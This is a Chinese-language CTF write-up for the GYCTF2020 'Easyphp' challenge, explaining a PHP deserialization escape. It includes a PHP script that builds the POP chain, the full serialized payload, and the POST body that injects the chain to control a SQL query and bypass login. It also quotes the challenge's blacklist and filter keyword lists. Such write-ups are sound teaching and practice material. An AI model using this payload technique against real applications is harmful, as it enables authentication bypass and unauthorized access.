# \[GYCTF2020]Easyphp

## \[GYCTF2020]Easyphp

## 考点

* 反序列化逃逸

## wp

www.zip给了源码

大概的逻辑就是index.php判断有没有登录，登录就转到update.php，没有登录就转到登录页面

在登录页面获取参数，并做黑名单过滤，然后执行`User::login()`

```
preg_match("/union|select|drop|delete|insert|\#|\%|\`|\@|\\\\/i", $_POST['***'])
```

在`User::login()`中连接数据库，然后用预编译的方式执行sql语句获取username和password，这里基本上封死了sql注入。如果登录成功就让`$_SESSION['login']`为1，然后跳转到update.php

```php
$mysqli=new dbCtrl();
$this->id=$mysqli->login('select id,password from user where username=?');

if($this->id)        $_SESSION['login']=1;
```

再看update.php，先判断`$_SESSION['login']`是否为1，不为1就\*\*`echo`**而不是**`die`\*\*。那后面的代码还可以执行啊。

![](<../../.gitbook/assets/image (19) (1) (1) (1) (1).png>)

然后到`User::update()`，先反序列化`Info`类再实例化`UpdateHelper`

```php
    public function update(){
        $Info=unserialize($this->getNewinfo());
        $age=$Info->age;
        $nickname=$Info->nickname;
        $updateAction=new UpdateHelper($_SESSION['id'],$Info,"update user SET age=$age,nickname=$nickname where id=".$_SESSION['id']);
        //这个功能还没有写完 先占坑
    }
    public function getNewInfo(){
        $age=$_POST['age'];
        $nickname=$_POST['nickname'];
        return safe(serialize(new Info($age,$nickname)));
    }
Class UpdateHelper{
    public $id;
    public $newinfo;
    public $sql;
    public function __construct($newInfo,$sql){
        $newInfo=unserialize($newInfo);
        $upDate=new dbCtrl();
    }
    public function __destruct()
    {
        echo $this->sql;
    }
}
```

```php
class Info{
    public $age;
    public $nickname;
    public $CtrlCase;
    public function __construct($age,$nickname){
        $this->age=$age;
        $this->nickname=$nickname;
    }
    public function __call($name,$argument){
        echo $this->CtrlCase->login($argument[0]);
    }
}
```

这里获取flag的条件是`$_SESSION['login']`为1

```php
if($_SESSION['login']===1){
  require_once("flag.php");
  echo $flag;
}
```

而`$_SESSION['login']`为1要求成功登录，即token为admin或者账号密码正确

```php
$mysqli=new dbCtrl();
$this->id=$mysqli->login('select id,password from user where username=?');
if($this->id){
$_SESSION['id']=$this->id;
$_SESSION['login']=1;}
class dbCtrl
{
    public function login($sql)
    {
        $this->mysqli=new mysqli($this->hostname, $this->dbuser, $this->dbpass, $this->database);
        $result=$this->mysqli->prepare($sql);
        $result->bind_param('s', $this->name);
        $result->execute();
        $result->bind_result($idResult, $passwordResult);
        $result->fetch();
        $result->close();
        if ($this->token=='admin') {
            return $idResult;
        }
        if (!$idResult) {
            echo('用户不存在!');
            return false;
        }
        if (md5($this->password)!==$passwordResult) {
            echo('密码错误！');
            return false;
        }
        $_SESSION['token']=$this->name;
        return $idResult;
    }
}
```

从`User::update()`入手，它的第一行`$Info=unserialize($this->getNewinfo());`如下，一个典型的逃逸

```php
function safe($parm){
    $array= array('union','regexp','load','into','flag','file','insert',"'",'\\',"*","alter");
    return str_replace($array,'hacker',$parm);
}
unserialize(safe(serialize(new Info($age,$nickname))));
```

可以利用逃逸，插入UpdateHelper类，触发它的`__destruct()`函数，再去触发User类的`__toString()`，最后触发Info类的`__call()`，让它执行`dbCtrl::login()`，这样就能够控制sql语句，实现登录了

pop链

```php
<?php
class dbCtrl{}
$d = new dbCtrl();
$d->name = "admin";// admin这个用户名是存在的，可以试出来
$d->password = "1";// 与select语句中的密码保持一致，绕过登录

class Info{}
$c = new Info();
$c->CtrlCase = $d;

class User{}
$b = new User();
$b->nickname = $c;
$b->age = 'select 1,"c4ca4238a0b923820dcc509a6f75849b" from user where username=?';

class UpdateHelper{}
$a = new UpdateHelper();
$a->sql = $b;

echo serialize($a);
// O:12:"UpdateHelper":1:{s:3:"sql";O:4:"User":2:{s:8:"nickname";O:4:"Info":1:{s:8:"CtrlCase";O:6:"dbCtrl":2:{s:4:"name";s:5:"admin";s:8:"password";s:1:"1";}}s:3:"age";s:70:"select 1,"c4ca4238a0b923820dcc509a6f75849b" from user where username=?";}}
```

逃逸插入pop链，不断调整`*`或者`union`的数量，让插入pop链的结果符合反序列化条件

```php
<?php
class Info{}
$b = new Info();
$b->age = "123";
$b->nickname = '***************************************************unionunionunion";s:4:"test";O:12:"UpdateHelper":1:{s:3:"sql";O:4:"User":2:{s:8:"nickname";O:4:"Info":1:{s:8:"CtrlCase";O:6:"dbCtrl":2:{s:4:"name";s:5:"admin";s:8:"password";s:1:"1";}}s:3:"age";s:70:"select 1,"c4ca4238a0b923820dcc509a6f75849b" from user where username=?";}}';


$s = serialize($b);
echo $s."<br>";

function safe($parm){
    $array= array('union','regexp','load','into','flag','file','insert',"'",'\\',"*","alter");
    return str_replace($array,'hacker',$parm);
}
echo safe($s)."<br>";
/*
O:4:"Info":2:{s:3:"age";s:3:"123";s:8:"nickname";s:324:"***************************************************unionunionunion";s:4:"test";O:12:"UpdateHelper":1:{s:3:"sql";O:4:"User":2:{s:8:"nickname";O:4:"Info":1:{s:8:"CtrlCase";O:6:"dbCtrl":2:{s:4:"name";s:5:"admin";s:8:"password";s:1:"1";}}s:3:"age";s:70:"select 1,"c4ca4238a0b923820dcc509a6f75849b" from user where username=?";}}";}
O:4:"Info":2:{s:3:"age";s:3:"123";s:8:"nickname";s:324:"hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker";s:4:"test";O:12:"UpdateHelper":1:{s:3:"sql";O:4:"User":2:{s:8:"nickname";O:4:"Info":1:{s:8:"CtrlCase";O:6:"dbCtrl":2:{s:4:"name";s:5:"admin";s:8:"password";s:1:"1";}}s:3:"age";s:70:"select 1,"c4ca4238a0b923820dcc509a6f75849b" from user where username=?";}}";}
*/
```

在update.php中POST

```
age=123&nickname=***************************************************unionunionunion";s:4:"test";O:12:"UpdateHelper":1:{s:3:"sql";O:4:"User":2:{s:8:"nickname";O:4:"Info":1:{s:8:"CtrlCase";O:6:"dbCtrl":2:{s:4:"name";s:5:"admin";s:8:"password";s:1:"1";}}s:3:"age";s:70:"select 1,"c4ca4238a0b923820dcc509a6f75849b" from user where username=?";}}
```

![](<../../.gitbook/assets/image (26) (1) (1) (1).png>)

这会让`dbCtrl::login()`成功执行，把token赋值为admin。

```php
        if ($this->token=='admin') {
            return $idResult;
        }
        if (!$idResult) {
            echo('用户不存在!');
            return false;
        }
        if (md5($this->password)!==$passwordResult) {
            echo('密码错误！');
            return false;
        }
        $_SESSION['token']=$this->name;
```

再用admin加上任意密码登录即可

![](<../../.gitbook/assets/image (2) (1) (1) (1).png>)
